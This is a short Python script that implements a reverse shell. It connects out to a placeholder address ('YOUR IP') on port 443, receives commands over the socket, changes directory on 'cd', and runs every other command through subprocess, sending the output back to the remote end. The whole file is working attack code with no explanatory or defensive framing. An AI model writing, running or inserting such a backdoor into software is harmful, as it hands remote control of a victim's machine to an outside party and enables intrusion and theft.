import socket
import subprocess
import os

s = socket.socket()

s.connect(("YOUR IP", 443))

while True:
    
    command = s.recv(1024).decode()

   
    if command.strip() == "exit":
        break

    
    if command.strip()[:2] == "cd":
        os.chdir(command.strip()[3:])
        continue
    
    output = subprocess.getoutput(command)

    
    s.send(output.encode())


s.close()